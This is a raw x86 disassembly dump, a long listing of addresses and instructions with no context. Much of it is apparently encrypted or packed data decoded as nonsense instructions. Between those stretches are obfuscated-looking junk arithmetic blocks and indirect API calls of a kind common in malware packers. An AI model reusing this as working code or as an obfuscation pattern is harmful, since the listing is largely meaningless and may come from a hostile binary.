  41dbf8:	mov    esp,DWORD PTR [edi-0x9]
  41dbfb:	pop    edi
  41dbfc:	xlat   BYTE PTR ds:[ebx]
  41dbfd:	mov    esi,DWORD PTR [eax]
  41dbff:	push   ecx
  41dc00:	sbb    edi,esp
  41dc02:	and    BYTE PTR [ebx],dl
  41dc04:	les    ebp,FWORD PTR [ebx-0x1d21ad9]
  41dc0a:	test   BYTE PTR [ecx],bl
  41dc0c:	clc    
  41dc0d:	sbb    eax,0xfc0639c4
  41dc12:	nop
  41dc13:	and    DWORD PTR [edi],ecx
  41dc15:	pop    ebx
  41dc16:	push   0x7f
  41dc18:	loopne 0x41dbf8
  41dc1a:	ss sub al,0xe7
  41dc1d:	inc    esi
  41dc1e:	int3   
  41dc1f:	adc    bl,ah
  41dc21:	test   al,0x8b
  41dc23:	inc    esp
  41dc24:	(bad)  
  41dc25:	rcl    BYTE PTR [ebx+0x502f1a1c],0xfa
  41dc2c:	or     eax,0x645e0941
  41dc31:	pop    ds
  41dc32:	or     BYTE PTR [edx],ch
  41dc34:	add    DWORD PTR [ebx],ecx
  41dc36:	add    edi,DWORD PTR [esp+ebx*8-0x3d158b0b]
  41dc3d:	adc    esi,ebp
  41dc3f:	mov    BYTE PTR [edi+0x48b30b0e],cl
  41dc45:	xor    dl,dl
  41dc47:	ret    
  41dc48:	ins    DWORD PTR es:[edi],dx
  41dc49:	repz mov bh,BYTE PTR [ecx+0x78963d7d]
  41dc50:	xor    al,0x28
  41dc52:	and    edi,DWORD PTR [ebx+0x61]
  41dc55:	add    eax,0xf0ea7d8e
  41dc5a:	retf   0x25a3
  41dc5d:	imul   edi,DWORD PTR [edi-0x7bed49bc],0x0
  41dc64:	pusha  
  41dc65:	jb     0x41dc7c
  41dc67:	sbb    dl,dl
  41dc69:	or     ah,0xcf
  41dc6c:	mov    al,0x5c
  41dc6e:	pop    ss
  41dc6f:	or     eax,0xbb51627c
  41dc74:	sbb    eax,0x442301a1
  41dc79:	cmc    
  41dc7a:	out    0xb2,al
  41dc7c:	xchg   DWORD PTR [ebp-0x53737995],esp
  41dc82:	test   eax,0x22450170
  41dc87:	frndint 
  41dc89:	mov    ah,0xba
  41dc8b:	cmp    ah,BYTE PTR [ecx-0x32]
  41dc8e:	mov    ds:0xa2b9158e,al
  41dc93:	test   eax,0xaadde7e8
  41dc98:	out    dx,eax
  41dc99:	ret    0x304f
  41dc9c:	in     eax,dx
  41dc9d:	hlt    
  41dc9e:	jecxz  0x41dcd9
  41dca0:	retf   0x23c3
  41dca3:	sub    eax,0x10080279
  41dca8:	push   ebx
  41dca9:	call   0x62d1d310
  41dcae:	inc    esi
  41dcaf:	fistp  WORD PTR [esi+ebx*1+0x3b]
  41dcb4:	inc    edi
  41dcb5:	dec    edx
  41dcb6:	call   0x9331:0x7901fb1b
  41dcbd:	pop    ebx
  41dcbe:	inc    edi
  41dcbf:	pusha  
  41dcc0:	repz je 0x41dca2
  41dcc3:	and    ah,BYTE PTR [ebp+0x39]
  41dcc6:	loopne 0x41dd3d
  41dcc8:	adc    DWORD PTR [eax-0x1059a819],esp
  41dcce:	adc    esi,DWORD PTR [ebx]
  41dcd0:	sub    DWORD PTR [ebx+0x36c6d71d],esi
  41dcd6:	dec    ebp
  41dcd7:	fsub   DWORD PTR [edx]
  41dcd9:	stos   BYTE PTR es:[edi],al
  41dcda:	(bad)  
  41dcdb:	fwait
  41dcdc:	dec    edx
  41dcdd:	nop    esi
  41dce0:	and    ah,BYTE PTR [eax+0x63]
  41dce3:	mov    BYTE PTR [ebp+eiz*2+0x667d882f],ch
  41dcea:	mov    al,ds:0x18eaaf94
  41dcef:	cdq    
  41dcf0:	pushf  
  41dcf1:	sub    esp,DWORD PTR ds:0xe11709a7
  41dcf7:	repz xor DWORD PTR ds:0xd742fdb6,esp
  41dcfe:	sub    bl,bl
  41dd00:	sub    BYTE PTR [esi+0x4d],dl
  41dd03:	shr    BYTE PTR [ebp-0x42],1
  41dd06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd07:	push   es
  41dd08:	sbb    ch,al
  41dd0a:	dec    eax
  41dd0b:	shl    BYTE PTR [esi],0x77
  41dd0e:	jae    0x41dce0
  41dd10:	mov    ds:0x3ea2a46d,eax
  41dd15:	dec    ebx
  41dd16:	in     eax,dx
  41dd17:	fnstenv [esi+0x1]
  41dd1a:	fs test eax,0x1f75075f
  41dd20:	movzx  ebx,ah
  41dd23:	pop    esp
  41dd24:	test   BYTE PTR ds:[edx+0x7f1dd74f],dl
  41dd2b:	jbe    0x41dd4f
  41dd2d:	test   al,0x86
  41dd2f:	add    DWORD PTR [ebx+0x2c],edx
  41dd32:	mov    eax,ds:0x430465c0
  41dd37:	adc    DWORD PTR [edi],edi
  41dd39:	xor    al,0xc5
  41dd3b:	push   edi
  41dd3c:	sub    cl,al
  41dd3e:	test   eax,0xa20561af
  41dd43:	inc    eax
  41dd44:	push   ebx
  41dd45:	jne    0x41dd0b
  41dd47:	jne    0x41dcd8
  41dd49:	jg     0x41dd44
  41dd4b:	lahf   
  41dd4c:	sub    bh,0x34
  41dd4f:	out    0xa0,eax
  41dd51:	and    ebx,DWORD PTR [edi+0x1725a646]
  41dd57:	mov    ds:0x136a8d0,al
  41dd5c:	add    eax,0x35b3c735
  41dd61:	in     eax,0x6f
  41dd63:	mov    edx,0xb81800e
  41dd68:	(bad)  
  41dd69:	int3   
  41dd6a:	nop
  41dd6b:	lock cli 
  41dd6d:	lods   eax,DWORD PTR ds:[esi]
  41dd6e:	jmp    0xcac10d80
  41dd73:	push   eax
  41dd74:	dec    esi
  41dd75:	or     edx,ebp
  41dd77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd78:	nop
  41dd79:	arpl   WORD PTR [ebp-0x32dea68d],ax
  41dd7f:	jnp    0x41ddf2
  41dd81:	fdiv   QWORD PTR [ecx]
  41dd83:	push   ebx
  41dd84:	fs dec esp
  41dd86:	dec    ebx
  41dd87:	aaa    
  41dd88:	retf   0x1662
  41dd8b:	push   0x32
  41dd8d:	mov    ah,0x6e
  41dd8f:	sbb    cl,bl
  41dd91:	cmp    dl,BYTE PTR [edx+eiz*2]
  41dd94:	and    BYTE PTR [eax],cl
  41dd96:	pop    edx
  41dd97:	lahf   
  41dd98:	jns    0x41ddfe
  41dd9a:	mov    BYTE PTR [eax],al
  41dd9c:	pop    ecx
  41dd9d:	popa   
  41dd9e:	not    BYTE PTR [ebx]
  41dda0:	jne    0x41dd3d
  41dda2:	lea    esp,ds:0x3f13d8bd
  41dda8:	add    al,BYTE PTR [eax-0x11b9b0f0]
  41ddae:	dec    esi
  41ddaf:	or     eax,0xe2d3f0ac
  41ddb4:	shl    DWORD PTR [eax+0x2a12e39b],0xa0
  41ddbb:	sub    eax,ebx
  41ddbd:	test   al,0x3a
  41ddc0:	sub    BYTE PTR [ebx+0x55e3749e],0xaf
  41ddc7:	out    0x1f,al
  41ddc9:	fild   QWORD PTR [edi+eax*8-0x16]
  41ddcd:	retf   
  41ddce:	add    BYTE PTR [ebx+0x37],bh
  41ddd1:	sub    al,BYTE PTR [esi+0xd8afa15]
  41ddd7:	stos   BYTE PTR es:[edi],al
  41ddd8:	sub    ebp,esp
  41ddda:	lea    ebx,[edi+0x359430a5]
  41dde0:	xlat   BYTE PTR ds:[ebx]
  41dde1:	dec    edi
  41dde2:	and    al,0xab
  41dde4:	icebp  
  41dde5:	adc    DWORD PTR [ebx-0x11],eax
  41dde8:	xor    eax,0x17626214
  41dded:	xchg   ebx,eax
  41ddee:	fnsave [edi+esi*8+0x74]
  41ddf2:	mov    ebx,ecx
  41ddf4:	hlt    
  41ddf5:	cs (bad) 
  41ddf7:	mov    esi,0xef8cd36
  41ddfc:	fist   DWORD PTR [edx]
  41ddfe:	popa   
  41ddff:	adc    eax,DWORD PTR [eax+ecx*1-0x37]
  41de03:	out    0x2c,al
  41de05:	mov    al,0xd9
  41de07:	xchg   ecx,eax
  41de08:	xor    ecx,DWORD PTR [ecx-0x479d79fb]
  41de0e:	cs inc ebp
  41de10:	pop    es
  41de11:	sub    BYTE PTR [edi+0x2e82f1bc],cl
  41de17:	lahf   
  41de18:	popa   
  41de19:	bound  edx,QWORD PTR [ebx+0x6e]
  41de1c:	xor    DWORD PTR [ecx-0x16],ebp
  41de1f:	xor    ebp,DWORD PTR [ebx-0x42]
  41de22:	sub    ecx,DWORD PTR [esi-0x6c]
  41de25:	push   ss
  41de26:	pop    ebp
  41de27:	fwait
  41de28:	mov    al,ah
  41de2a:	enter  0x4d9d,0x76
  41de2e:	adc    ecx,0x71d860ec
  41de34:	ja     0x41de70
  41de36:	mov    bl,0xb6
  41de38:	jge    0x41de6d
  41de3a:	js     0x41deb2
  41de3c:	aaa    
  41de3d:	div    esi
  41de3f:	mov    edx,DWORD PTR [ebp-0x2c]
  41de42:	xor    eax,edx
  41de44:	mov    edx,DWORD PTR ds:0x4282cd
  41de4a:	adc    DWORD PTR ds:0x428199,edx
  41de50:	mov    edx,DWORD PTR [ebp+0x14]
  41de53:	sub    DWORD PTR ds:0x4281a5,0x428241
  41de5d:	mov    ecx,DWORD PTR [edx+ecx*1]
  41de60:	xor    DWORD PTR ds:0x4282d1,0x7206
  41de6a:	lea    eax,[eax+ecx*1-0x19e5]
  41de71:	xor    ecx,ecx
  41de73:	or     ecx,DWORD PTR ds:0x42822d
  41de79:	adc    ecx,DWORD PTR ds:0x428195
  41de7f:	mov    DWORD PTR ds:0x42822d,ecx
  41de85:	mov    DWORD PTR [ebp-0x78],eax
  41de88:	cmp    DWORD PTR ds:0x42826d,0x0
  41de8f:	mov    DWORD PTR ds:0x4282b9,0x350
  41de99:	mov    ecx,0x74e5
  41de9e:	jmp    0x41df01
  41dea3:	mov    DWORD PTR ds:0x4281b1,0x4668
  41dead:	mov    eax,0x6451
  41deb2:	cmp    DWORD PTR ds:0x42826d,0x0
  41deb9:	jle    0x41dee3
  41debf:	push   0x888f
  41dec4:	push   0x108a
  41dec9:	call   DWORD PTR ds:0x4289b4
  41decf:	add    DWORD PTR ds:0x428269,ecx
  41ded5:	or     DWORD PTR ds:0x4282bd,0x428229
  41dedf:	and    ecx,ecx
  41dee1:	sub    ecx,ecx
  41dee3:	mov    ecx,DWORD PTR ds:0x428265
  41dee9:	mov    ecx,DWORD PTR [ecx]
  41deeb:	add    DWORD PTR ds:0x4281ad,ecx
  41def1:	and    DWORD PTR ds:0x428225,0x25be
  41defb:	adc    ecx,0x1574
  41df01:	mov    eax,ds:0x4224fc
  41df06:	mov    ecx,DWORD PTR ds:0x422500
  41df0c:	or     DWORD PTR ds:0x428199,0x428225
  41df16:	sub    eax,ecx
  41df18:	xor    eax,0x59da
  41df1d:	sbb    ecx,DWORD PTR ds:0x428221
  41df23:	imul   eax,eax,0x11d
  41df29:	add    eax,0x34c4
  41df2e:	dec    ecx
  41df2f:	mov    ecx,0x75218f
  41df34:	sub    ecx,eax
  41df36:	mov    DWORD PTR [ebp-0x10],ecx
  41df39:	cmp    DWORD PTR ds:0x428209,0x0
  41df40:	not    ecx
  41df42:	mov    ecx,0x23c4
  41df47:	mov    ecx,0x56bc
  41df4c:	mov    DWORD PTR ds:0x42822d,edi
  41df52:	jmp    0x41df98
  41df57:	mov    DWORD PTR ds:0x4282c9,0x7401
  41df61:	cmp    DWORD PTR ds:0x428209,0x0
  41df68:	jbe    0x41df81
  41df6e:	push   0x400000
  41df73:	call   DWORD PTR ds:0x428a48
  41df79:	add    ecx,ecx
  41df7b:	add    ecx,DWORD PTR ds:0x4282c5
  41df81:	movzx  ecx,WORD PTR ds:0x4282b5
  41df88:	xor    DWORD PTR ds:0x4281b1,ecx
  41df8e:	sub    DWORD PTR ds:0x4282b1,0x428275
  41df98:	mov    DWORD PTR [ebp-0x20],0x505d
  41df9f:	sub    DWORD PTR ds:0x4282c5,0x6577
  41dfa9:	mov    eax,DWORD PTR [ebp-0x20]
  41dfac:	and    DWORD PTR ds:0x4282c5,0x1dd7
  41dfb6:	xor    eax,0x518a
  41dfbb:	xor    eax,0x29cf
  41dfc0:	movzx  ecx,BYTE PTR ds:0x428285
  41dfc7:	or     DWORD PTR ds:0x4281b1,ecx
  41dfcd:	jmp    0x41e26a
  41dfd2:	adc    DWORD PTR [eax+0x1],0xffffff81
  41dfd6:	sbb    DWORD PTR [ecx-0x4b2ba77d],edx
  41dfdc:	mov    ecx,0xd874042f
  41dfe1:	outs   dx,DWORD PTR ds:[esi]
  41dfe2:	cmp    eax,0xb2bbc18c
  41dfe7:	mov    edi,0xa300bbbb
  41dfec:	and    al,0x53
  41dfee:	dec    eax
  41dfef:	pushf  
  41dff0:	pop    ss
  41dff1:	pop    edx
  41dff2:	jae    0x41dfbf
  41dff4:	mov    ebp,0x28b24264
  41dff9:	adc    dh,BYTE PTR [ebx+0x47]
  41dffc:	jae    0x41e007
  41dffe:	dec    esp
  41dfff:	dec    edi
  41e001:	and    edi,esi
  41e003:	jbe    0x41dfad
  41e005:	scas   al,BYTE PTR es:[edi]
  41e006:	and    BYTE PTR [esi],bl
  41e008:	imul   edx,DWORD PTR [esi-0x523aa958],0x1df147e1
  41e012:	xchg   ebx,eax
  41e013:	lods   eax,DWORD PTR ds:[esi]
  41e014:	loope  0x41e025
  41e016:	das    
  41e017:	jle    0x41e032
  41e019:	xor    DWORD PTR [ebx],edi
  41e01b:	xchg   DWORD PTR [ecx-0x4e3be388],ecx
  41e021:	movlps xmm5,QWORD PTR ds:0x34355a96
  41e028:	xor    DWORD PTR [esi-0x40],esi
  41e02b:	cmc    
  41e02c:	add    dh,BYTE PTR [edi+eax*2+0x4c247cd5]
  41e033:	shl    ebp,1
  41e035:	adc    al,0x93
  41e037:	call   0xd982:0xa8c15079
  41e03e:	in     al,0xde
  41e040:	test   BYTE PTR [ebp-0x71f0b6f7],ah
  41e046:	sbb    al,0x6d
  41e048:	js     0x41dfdc
  41e04a:	jecxz  0x41e09c
  41e04c:	jno    0x41e0c2
  41e04e:	xor    DWORD PTR [ebp+0x34],ebx
  41e051:	sbb    edx,DWORD PTR [esi+eax*2]
  41e054:	cmc    
  41e055:	push   ebp
  41e056:	or     eax,0xb8de3b3d
  41e05b:	cmc    
  41e05c:	add    BYTE PTR [ebx-0x36341e01],0xf4
  41e063:	enter  0x422b,0xcd
  41e067:	inc    ebp
  41e068:	sub    eax,0xbb5b1d93
  41e06d:	cmp    BYTE PTR [edx],0x27
  41e070:	cmp    BYTE PTR [ebx-0x2f],bh
  41e073:	mov    dl,0xa9
  41e075:	dec    ebx
  41e076:	in     al,dx
  41e077:	imul   eax,edi,0xffffffa1
  41e07a:	cmp    al,0x69
  41e07c:	push   esi
  41e07d:	inc    eax
  41e07e:	inc    ecx
  41e07f:	int    0x33
  41e081:	mov    al,0x63
  41e083:	enter  0x2fb7,0xb5
  41e087:	mov    eax,ds:0xaf893a50
  41e08c:	pop    edx
  41e08d:	aam    0xb3
  41e08f:	imul   edx,DWORD PTR [edi+ebx*8-0x40852191],0x1
  41e097:	into   
  41e098:	mov    cl,0x45
  41e09a:	pop    eax
  41e09b:	push   edx
  41e09c:	mov    ch,0x56
  41e09e:	loop   0x41e0df
  41e0a0:	enter  0x61bc,0x6d
  41e0a4:	cwde   
  41e0a5:	cld    
  41e0a6:	mov    al,ds:0x1fdf5381
  41e0ab:	in     al,0x42
  41e0ad:	sbb    bh,BYTE PTR [ebp-0x27f9002a]
  41e0b3:	jno    0x41e08e
  41e0b5:	inc    ebp
  41e0b6:	stos   BYTE PTR es:[edi],al
  41e0b7:	(bad)  
  41e0b8:	cwde   
  41e0b9:	ins    BYTE PTR es:[edi],dx
  41e0ba:	push   ebp
  41e0bb:	leave  
  41e0bc:	push   esi
  41e0bd:	pop    edx
  41e0be:	loopne 0x41e12b
  41e0c0:	imul   ebp,DWORD PTR [edi+esi*4+0x16],0x8
  41e0c5:	adc    cl,BYTE PTR [edi]
  41e0c7:	mov    al,cl
  41e0c9:	dec    edx
  41e0ca:	repnz and eax,0x40c84393
  41e0d0:	jno    0x41e067
  41e0d2:	adc    DWORD PTR [eax*2-0x5f3df104],ebp
  41e0d9:	or     DWORD PTR [edi],0xfcd7ec14
  41e0df:	push   ebx
  41e0e0:	lahf   
  41e0e1:	mov    ss,WORD PTR [edx+0x6a]
  41e0e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0e5:	mov    bl,0x22
  41e0e7:	scas   al,BYTE PTR es:[edi]
  41e0e8:	cmp    al,0xd5
  41e0ea:	jbe    0x41e153
  41e0ec:	in     al,dx
  41e0ed:	arpl   WORD PTR [esi+0x6a],dx
  41e0f0:	mov    ecx,0x890513ac
  41e0f5:	repz ret 
  41e0f7:	ret    
  41e0f8:	cmp    eax,0x3f93f15
  41e0fd:	pop    ss
  41e0fe:	xor    eax,0xd038531a
  41e103:	shr    BYTE PTR [esi],cl
  41e105:	inc    DWORD PTR [esi+0x63]
  41e108:	into   
  41e109:	sti    
  41e10a:	cmp    al,0x8c
  41e10c:	stc    
  41e10d:	cld    
  41e10e:	push   0x8
  41e110:	dec    edx
  41e111:	or     esp,ecx
  41e113:	test   BYTE PTR [esi+esi*8-0x54],cl
  41e117:	add    al,0xb9
  41e119:	adc    edi,0xffffff81
  41e11c:	cmp    DWORD PTR [edx+ebp*4-0x23781e7b],ebp
  41e123:	js     0x41e108
  41e125:	sub    BYTE PTR [eax],dl
  41e127:	inc    ecx
  41e128:	or     dh,BYTE PTR [eax]
  41e12a:	xor    DWORD PTR [ebx],ebx
  41e12c:	scas   eax,DWORD PTR es:[edi]
  41e12d:	inc    esp
  41e12e:	adc    esi,DWORD PTR [edi+0xf]
  41e131:	adc    BYTE PTR [edi],bl
  41e133:	mov    bh,0x96
  41e135:	jb     0x41e12f
  41e137:	fs jle 0x41e0c8
  41e13a:	xchg   edi,eax
  41e13b:	jmp    0xb38820dc
  41e140:	mov    edi,0x91be30a9
  41e145:	mov    dh,0xf9
  41e147:	and    eax,0xeb3a7d41
  41e14c:	cld    
  41e14d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e14e:	lock jp 0x41e165
  41e151:	mov    edx,0xd08cba18
  41e156:	push   0x41
  41e158:	aaa    
  41e159:	imul   ebx,DWORD PTR [ebp+0x58455624],0x733bfb22
  41e163:	fwait
  41e164:	(bad)
  41e168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e169:	inc    ebx
  41e16a:	or     al,0xd7
  41e16c:	icebp  
  41e16d:	jl     0x41e160
  41e16f:	mov    dl,cl
  41e171:	mov    ah,0xc5
  41e173:	pop    ebx
  41e174:	pop    edi
  41e175:	test   BYTE PTR [esi],bl
  41e177:	je     0x41e166
  41e179:	test   al,0x29
  41e17b:	idiv   DWORD PTR [esi]
  41e17d:	scas   al,BYTE PTR es:[edi]
  41e17e:	das    
  41e17f:	stc    
  41e180:	push   ebx
  41e181:	retf   0x1f7d
  41e184:	hlt    
  41e185:	daa    
  41e186:	xor    BYTE PTR [ecx],ch
  41e188:	mov    esp,0x1777bbde
  41e18d:	and    eax,0x2cc9d90a
  41e192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e193:	cmc    
  41e194:	mov    ch,0x75
  41e196:	fnstenvw [eax+ebx*4-0x73]
  41e19b:	sub    DWORD PTR [ebx+eax*4+0x78],0x15
  41e1a0:	sub    al,0x97
  41e1a2:	(bad)  
  41e1a3:	rcl    DWORD PTR [eax],0xc1
  41e1a6:	aas    
  41e1a7:	outs   dx,DWORD PTR ds:[esi]
  41e1a8:	mov    bh,0x26
  41e1aa:	pop    esi
  41e1ab:	xchg   esp,eax
  41e1ac:	and    dh,dl
  41e1ae:	ja     0x41e1dc
  41e1b0:	pusha  
  41e1b1:	dec    ebp
  41e1b2:	(bad)  
  41e1b3:	dec    dl
  41e1b5:	gs push esi
  41e1b7:	and    BYTE PTR [ebx+0x2d],ah
  41e1ba:	and    eax,0x44ed6e4a
  41e1bf:	sbb    al,0x45
  41e1c1:	add    al,0xd8
  41e1c3:	arpl   WORD PTR [eax+0x11],cx
  41e1c6:	mov    dl,0x7e
  41e1c8:	(bad)  
  41e1c9:	mov    bl,0x23
  41e1cb:	push   eax
  41e1cc:	adc    ebx,edi
  41e1ce:	sub    DWORD PTR [edi+0x3eda88b3],0x69
  41e1d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1d6:	popf   
  41e1d7:	lea    esp,[esi+0x4b3f6bf8]
  41e1dd:	gs sub al,0x2b
  41e1e0:	out    dx,eax
  41e1e1:	jecxz  0x41e239
  41e1e3:	(bad)  
  41e1e4:	inc    ebx
  41e1e5:	jb     0x41e1aa
  41e1e7:	dec    ebx
  41e1e8:	dec    ecx
  41e1e9:	push   0x9c733284
  41e1ee:	das    
  41e1ef:	jno    0x41e183
  41e1f1:	lds    eax,FWORD PTR [ebx+0xf]
  41e1f4:	mov    edi,0xb2071ed7
  41e1f9:	adc    BYTE PTR [eax],ah
  41e1fb:	dec    ebp
  41e1fc:	pop    ebp
  41e1fd:	stos   BYTE PTR es:[edi],al
  41e1fe:	mov    ebp,0x87db8b6c
  41e203:	outs   dx,DWORD PTR ds:[esi]
  41e204:	push   cs
  41e205:	test   BYTE PTR [edx+0x2b],bh
  41e208:	mov    ah,0xc5
  41e20b:	mov    ebx,0x5e9eb859
  41e210:	dec    esp
  41e211:	adc    dl,BYTE PTR [eax]
  41e213:	dec    esi
  41e214:	ds sar ecx,1
  41e217:	pop    ss
  41e218:	(bad)  
  41e219:	popa   
  41e21a:	push   edx
  41e21b:	nop
  41e21c:	add    al,BYTE PTR [ecx-0x1b]
  41e21f:	xor    bh,BYTE PTR [ecx-0x3b]
  41e222:	mov    ds:0x30329550,eax
  41e227:	arpl   di,di
  41e229:	push   ds
  41e22a:	or     al,0xa
  41e22c:	inc    esp
  41e22d:	push   ds
  41e22e:	imul   edi,DWORD PTR [ecx+0x24e863ec],0x597adf0
  41e238:	scas   al,BYTE PTR es:[edi]
  41e239:	(bad)  
  41e23a:	sar    DWORD PTR [ebx+0x61],1
  41e23d:	shl    BYTE PTR ds:0x313761a,1
  41e243:	add    cl,dh
  41e245:	xchg   ecx,eax
  41e246:	stos   DWORD PTR es:[edi],eax
  41e247:	jp     0x41e298
  41e249:	jne    0x41e1d5
  41e24b:	jae    0x41e232
  41e24d:	repnz mov ebx,0x5375d792
  41e253:	dec    esp
  41e254:	retf   0x99a5
  41e257:	ss ins BYTE PTR es:[edi],dx
  41e259:	outs   dx,DWORD PTR ds:[esi]
  41e25a:	mov    eax,ds:0x52867f93
  41e25f:	and    dl,BYTE PTR [ebx+0x74fc6703]
  41e265:	push   0xaa3c9cd0
  41e26a:	and    eax,0x5dd5
  41e26f:	mov    ecx,DWORD PTR ds:0x4282ed
  41e275:	mov    ecx,DWORD PTR [ecx]
  41e277:	add    DWORD PTR ds:0x42826d,ecx
  41e27d:	xor    eax,0x810
  41e282:	cmp    DWORD PTR ds:0x4281b1,0x0
  41e289:	mov    DWORD PTR ds:0x428241,0xe20
  41e293:	mov    ecx,0x897
  41e298:	not    ecx
  41e29a:	jmp    0x41e2ee
  41e29f:	mov    DWORD PTR ds:0x42827d,0x7763
  41e2a9:	cmp    DWORD PTR ds:0x4281b1,0x0
  41e2b0:	jb     0x41e2c8
  41e2b6:	push   0x42809f
  41e2bb:	push   0x2430
  41e2c0:	call   DWORD PTR ds:0x428a4c
  41e2c6:	dec    ecx
  41e2c7:	inc    ecx
  41e2c8:	and    DWORD PTR ds:0x428191,0x1e26
  41e2d2:	and    DWORD PTR ds:0x42826d,0x4281ad
  41e2dc:	mov    ecx,DWORD PTR ds:0x4282c1
  41e2e2:	xor    ecx,DWORD PTR ds:0x4281a1
  41e2e8:	mov    DWORD PTR ds:0x4282c1,ecx
  41e2ee:	mov    DWORD PTR [ebp-0x74],eax
  41e2f1:	sbb    DWORD PTR ds:0x42827d,0xe7f
  41e2fb:	mov    DWORD PTR [ebp-0x5c],0x6f8e
  41e302:	adc    DWORD PTR ds:0x4282c5,0x1dda
  41e30c:	mov    eax,DWORD PTR [ebp-0x5c]
  41e30f:	or     ecx,0x4aef
  41e315:	imul   eax,eax,0x3548
  41e31b:	and    ecx,DWORD PTR ds:0x42827d
  41e321:	mov    ecx,DWORD PTR ds:0x42250c
  41e327:	sbb    DWORD PTR ds:0x4281ad,0x3c51
  41e331:	sub    eax,ecx
  41e333:	cmp    DWORD PTR ds:0x428239,0x0
  41e33a:	mov    ecx,DWORD PTR ds:0x428239
  41e340:	mov    DWORD PTR ds:0x428281,edi
  41e346:	mov    DWORD PTR ds:0x428239,0x5aca
  41e350:	jmp    0x41e3bc
  41e355:	mov    DWORD PTR ds:0x4281a1,0x4ec6
  41e35f:	mov    DWORD PTR ds:0x4281b1,0x2987
  41e369:	cmp    DWORD PTR ds:0x428239,0x0
  41e370:	jae    0x41e3a0
  41e376:	push   DWORD PTR [ebp-0x14]
  41e379:	push   0x428211
  41e37e:	push   DWORD PTR [ebp-0x10]
  41e381:	push   DWORD PTR [ebp-0x18]
  41e384:	call   DWORD PTR ds:0x4289b8
  41e38a:	xor    DWORD PTR ds:0x42822d,0x798c
  41e394:	not    ecx
  41e396:	sbb    DWORD PTR ds:0x4282b1,0xf00
  41e3a0:	adc    DWORD PTR ds:0x428209,0x79a2
  41e3aa:	neg    ecx
  41e3ac:	add    DWORD PTR ds:0x428229,ecx
  41e3b2:	sbb    DWORD PTR ds:0x428275,0x1dd0
  41e3bc:	mov    ecx,DWORD PTR ds:0x422508
  41e3c2:	and    DWORD PTR ds:0x4282c5,0x42826d
  41e3cc:	imul   eax,ecx
  41e3cf:	add    DWORD PTR ds:0x428281,edi
  41e3d5:	mov    ecx,DWORD PTR ds:0x422504
  41e3db:	xor    DWORD PTR ds:0x428225,0x4282cd
  41e3e5:	and    eax,ecx
  41e3e7:	xor    eax,0x88
  41e3ec:	or     DWORD PTR ds:0x428271,edx
  41e3f2:	mov    DWORD PTR [ebp-0x70],eax
  41e3f5:	sbb    ecx,ecx
  41e3f7:	mov    DWORD PTR [ebp-0xb0],0x190b
  41e401:	mov    ecx,DWORD PTR ds:0x428285
  41e407:	or     ecx,DWORD PTR ds:0x428225
  41e40d:	mov    DWORD PTR ds:0x428285,ecx
  41e413:	mov    eax,DWORD PTR [ebp-0xb0]
  41e419:	add    eax,DWORD PTR ds:0x422514
  41e41f:	mov    ecx,DWORD PTR ds:0x422510
  41e425:	add    DWORD PTR ds:0x428269,0xd69
  41e42f:	xor    edx,edx
  41e431:	sub    DWORD PTR ds:0x428289,0x6114
  41e43b:	div    ecx
  41e43d:	cmp    DWORD PTR ds:0x4282c5,0x0
  41e444:	mov    DWORD PTR ds:0x4282c5,0x26a2
  41e44e:	not    ecx
  41e450:	jmp    0x41e4b5
  41e455:	mov    DWORD PTR ds:0x428191,0x3e56
  41e45f:	mov    DWORD PTR ds:0x4281b1,0x1528
  41e469:	cmp    DWORD PTR ds:0x4282c5,0x0
  41e470:	jg     0x41e495
  41e476:	push   0x42802f
  41e47b:	call   DWORD PTR ds:0x428a50
  41e481:	neg    ecx
  41e483:	or     ecx,DWORD PTR ds:0x4282c5
  41e489:	add    DWORD PTR ds:0x428241,ecx
  41e48f:	sub    DWORD PTR ds:0x428211,ebx
  41e495:	xor    DWORD PTR ds:0x42821d,ebx
  41e49b:	or     DWORD PTR ds:0x42820d,edi
  41e4a1:	or     DWORD PTR ds:0x428289,0x66bf
  41e4ab:	and    DWORD PTR ds:0x42822d,0x37db
  41e4b5:	or     eax,0x79b1
  41e4ba:	mov    ecx,DWORD PTR ds:0x428195
  41e4c0:	sbb    DWORD PTR ds:0x4282b9,ecx
  41e4c6:	sub    eax,0x7ff1
  41e4cb:	mov    DWORD PTR [ebp-0x28],eax
  41e4ce:	sub    DWORD PTR ds:0x4281a5,0x435d
  41e4d8:	mov    eax,ds:0x422518
  41e4dd:	xor    DWORD PTR ds:0x428285,edx
  41e4e3:	jmp    0x41e780
  41e4e8:	mov    ds,WORD PTR cs:[edx]
  41e4eb:	sbb    eax,0xbd3dbd9a
  41e4f0:	mov    dl,0x8e
  41e4f2:	cdq    
  41e4f3:	outs   dx,DWORD PTR ds:[esi]
  41e4f4:	jb     0x41e4b2
  41e4f6:	mov    esi,0xc18e343b
  41e4fb:	mov    ebx,0xbbbbbfb2
  41e500:	jns    0x41e48a
  41e502:	fld    QWORD PTR [ebx]
  41e504:	in     al,dx
  41e505:	jne    0x41e52d
  41e507:	pusha  
  41e508:	dec    eax
  41e509:	xchg   esp,eax
  41e50a:	cmp    edi,DWORD PTR [esi-0x3d]
  41e50d:	push   esi
  41e50e:	adc    DWORD PTR ds:0x9be1d4bb,eax
  41e514:	xor    DWORD PTR [ebp+0x53],ebx
  41e517:	cmp    esi,DWORD PTR [edi+esi*4-0x69b74c0d]
  41e51e:	repnz clc 
  41e520:	dec    esi
  41e521:	les    esi,FWORD PTR [esi]
  41e523:	retf   0xe06
  41e526:	jne    0x41e58c
  41e528:	scas   al,BYTE PTR es:[edi]
  41e529:	sub    BYTE PTR cs:[edi-0x6b],cl
  41e52d:	adc    ecx,edi
  41e52f:	pusha  
  41e530:	aad    0x23
  41e532:	(bad)
  41e535:	add    al,0x85
  41e537:	push   ds
  41e538:	mov    ecx,0x898a3012
  41e53d:	jb     0x41e4e9
  41e53f:	(bad)  
  41e540:	dec    ebx
  41e541:	clc    
  41e542:	jmp    FWORD PTR [edi]
  41e544:	mov    ah,0xa9
  41e546:	(bad)  
  41e547:	jecxz  0x41e58c
  41e549:	cmp    edi,DWORD PTR [eax+0x756a5f13]
  41e54f:	shl    BYTE PTR [edi+0x56],0x66
